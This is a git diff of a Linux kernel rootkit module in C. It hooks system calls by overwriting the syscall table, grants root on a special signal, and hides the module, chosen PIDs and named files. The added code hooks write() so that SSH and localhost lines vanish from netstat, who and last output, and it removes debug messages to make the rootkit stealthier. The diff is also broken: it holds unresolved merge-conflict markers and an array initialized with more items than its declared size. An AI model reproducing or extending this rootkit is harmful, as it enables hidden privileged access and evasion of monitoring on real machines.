@@ -5,12 +5,17 @@
 #include <linux/syscalls.h>
 #include <linux/cred.h>
 #include <linux/dirent.h>
+<<<<<<< HEAD
 #include <linux/uaccess.h>
 #include <linux/namei.h>
 #include <linux/errno.h>
+=======
+#include <linux/proc_fs.h>
+>>>>>>> 421c0d1e99a541c739731c4949e9eec449f509dc
 
 #include "modify_syscalls.h"
 
+//Macro functions to allow us to write to protected memory
 #define DISABLE_W_PROTECTED_MEMORY \
     do { \
         preempt_disable(); \
@@ -33,8 +38,8 @@
 
 // this are the filenames we want to hide
 // used in hacked_getdents(...)
-const int   TO_HIDE_SIZE = 3;
-const char* TO_HIDE[]    = { "test_file.txt", "modules_original", "rootkit" };
+const int   TO_HIDE_SIZE = 4;
+const char* TO_HIDE[]    = { "test_file.txt", "modules_original", "rootkit", "virus" };
 char hidePID[6] = "-1";
 
 // location of modules file
@@ -52,15 +57,17 @@ const char* replacement_values[] = { "/etc/modules_original\0" };
 // 0 = custom boot-loader not yet installed; don't use modified syscalls
 int boot_loader_init = 0;
 
+
+//Getting our original
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
 asmlinkage int (*original_kill)(pid_t, int);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage int (*original_stat)(const char *path, struct stat *buf);
 asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
 asmlinkage int (*original_open)(const char __user *pathname, int flags, mode_t mode);
+asmlinkage int (*original_write)(unsigned int fd, const char *buf, size_t count);
 
 struct list_head *module_list;
-
 
 void update_sys_calls(void **sys_call_table){
     void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
@@ -75,6 +82,8 @@ void update_sys_calls(void **sys_call_table){
     void *modified_function_lstat = hacked_lstat;
     void **modified_at_address_open = &sys_call_table[__NR_open];
     void *modified_function_open = hacked_open;
+    void **modified_at_address_write = &sys_call_table[__NR_write];
+    void *modified_function_write = hacked_write;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
@@ -83,6 +92,7 @@ void update_sys_calls(void **sys_call_table){
     original_stat = xchg(modified_at_address_stat, modified_function_stat);
     original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
     original_open = xchg(modified_at_address_open, modified_function_open);
+    original_write = xchg(modified_at_address_write, modified_function_write);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -99,6 +109,8 @@ void revert_to_original(void **sys_call_table){
     void *modified_function_lstat = original_lstat;
     void **modified_at_address_open = &sys_call_table[__NR_open];
     void *modified_function_open = original_open;
+    void **modified_at_address_write = &sys_call_table[__NR_write];
+    void *modified_function_write = original_write;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
@@ -107,6 +119,7 @@ void revert_to_original(void **sys_call_table){
     original_stat = xchg(modified_at_address_stat, modified_function_stat);
     original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
     original_open = xchg(modified_at_address_open, modified_function_open);
+    original_write = xchg(modified_at_address_write, modified_function_write);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -114,7 +127,6 @@ asmlinkage int hacked_sysinfo(struct sysinfo *info)
 {
     original_sysinfo(info);
     info->uptime = 0;
-    pr_info("System information modified!\n");
     return 0;
 }
 
@@ -125,18 +137,14 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
     switch(sig) {
         case SIG_GIVE_ROOT:
             give_root();
-            pr_info("Root priviledge given!\n");
             break;
         case SIG_HIDE:
-            pr_info("Hiding the module!\n");
             hide();
             break;
         case SIG_UNHIDE:
-            pr_info("Unhiding the module!\n");
             unhide();
             break;
         case SIG_HIDEPID:
-            pr_info("Hiding the PID %d,\n",pid);
             sprintf(hidePID, "%d", pid);
             break;
         default:
@@ -211,7 +219,6 @@ const char* strip_filepath(const char* filepath) {
 // code heavily inspired by:
 // https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/index.html
 // NOTE: this does not append 'No such file or directory' to the end;
-// is the error code return working?
 asmlinkage int hacked_stat(const char *path, struct stat *buf) {
     int j;
     const char* filename = strip_filepath(path);
@@ -269,6 +276,29 @@ asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) 
 
     return original_open(pathname, flags, mode);
 }
+
+asmlinkage int hacked_write(unsigned int fd, const char *buf, size_t count){
+    //modify the write syscall
+    //anytime ssh is to be written (like netstat) with file descriptor = 1 (to standard output or terminal), we hide it (for netstat, ss etc)
+    //anytime 127.0.0.1 is to be written, dont display (this is localhost, what we use to access through ssh - or at least what shows) (for last, who, etc...)
+    //use `strace` to find what words are written to standard output for each of the frequently used networking commands (who, w, netstat, ss, last)
+
+    char *keyWords[4] = {":ssh", "127.0.0.1", "localhost", ":22", "(127.0.0.1)"};
+    int i = 0;
+
+    if (fd == 1) {
+        //spot our 'keywords'
+        //if they are here, dont write anything at all
+        for(i; i < 4; i++){
+            if (strstr(buf, keyWords[i]) != NULL) {
+                return count;
+            }
+        }
+    }
+    //else, write as normal
+    return original_write(fd, buf, count);
+}
+
 
 void give_root(void)
 {
